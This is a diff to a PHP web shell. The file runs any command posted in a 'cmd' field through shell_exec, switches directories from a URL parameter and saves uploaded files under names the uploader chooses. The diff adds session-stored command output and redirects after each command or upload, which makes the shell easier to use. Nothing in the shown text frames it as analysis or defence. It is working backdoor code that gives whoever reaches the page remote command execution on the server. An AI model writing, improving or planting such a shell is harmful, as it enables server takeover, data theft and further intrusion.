@@ -1,5 +1,7 @@
 <?php
 
+session_start();
+
 if (isset($_GET['dir']))
 {
 	chdir($_GET['dir']);
@@ -8,12 +10,25 @@ $cwd = getcwd();
 
 if (isset($_POST['cmd']))
 {
-	$stdout = shell_exec($_POST['cmd'].' 2>&1');
+	$_SESSION['stdout'] = shell_exec($_POST['cmd'].' 2>&1');
+	header('Location: ?dir='.$cwd);
+	exit;
 }
 
-if (isset($_FILES['file']) && $_FILES['file']['error'] == 0)
+if (isset($_SESSION['stdout']))
 {
-	move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+	$stdout = $_SESSION['stdout'];
+	unset($_SESSION['stdout']);
+}
+
+if (isset($_FILES['file']))
+{
+	if ($_FILES['file']['error'] == 0)
+	{
+		move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+	}
+	header('Location: ?dir='.$cwd);
+	exit;
 }
 
 if (isset($_GET['file']))
